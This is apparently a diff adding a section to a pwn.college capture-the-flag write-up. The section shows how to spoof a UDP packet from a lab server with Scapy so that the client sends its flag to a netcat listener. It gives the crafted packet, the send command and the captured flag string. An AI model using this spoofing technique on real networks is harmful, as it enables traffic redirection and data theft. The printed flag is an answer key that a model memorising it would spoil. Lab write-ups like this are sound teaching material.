@@ -1600,3 +1600,47 @@ network.run()
 user_host.interactive(environ=parent_process.environ())
 ```
 
+The challenge sets up a virtual network where a client periodically sends `"ACTION?"` to a server over UDP, and if it ever receives a `FLAG:ip:port` response, it sends the actual flag to that address.
+Our goal is to trick the client into sending us the flag by spoofing a UDP packet from the server with our IP and port.
+
+We will have to put the listener in the background, and then send the packet in the same shell. 
+
+```
+root@ip-10-0-0-1:/# nc -u -lvp 9999 &
+[1] 785
+```
+
+```py
+>>> (IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / Raw(load="FLAG:10.0.0.1:9999")).display()
+###[ IP ]###
+  version   = 4
+  ihl       = None
+  tos       = 0x0
+  len       = None
+  id        = 1
+  flags     = 
+  frag      = 0
+  ttl       = 64
+  proto     = udp
+  chksum    = None
+  src       = 10.0.0.3
+  dst       = 10.0.0.2
+  \options   \
+###[ UDP ]###
+     sport     = 31337
+     dport     = 31338
+     len       = None
+     chksum    = None
+###[ Raw ]###
+        load      = b'FLAG:10.0.0.1:9999'
+```
+
+```py
+>>> send(IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / Raw(load="FLAG:10.0.0.1:9999"))
+.
+Sent 1 packets.
+>>> nc: getnameinfo: Temporary failure in name resolution
+pwn.college{Qa7I7oqR_1wCI546RKLcU_CW77L.QX1QDM2EDL4ITM0EzW}
+```
+
+&nbsp;
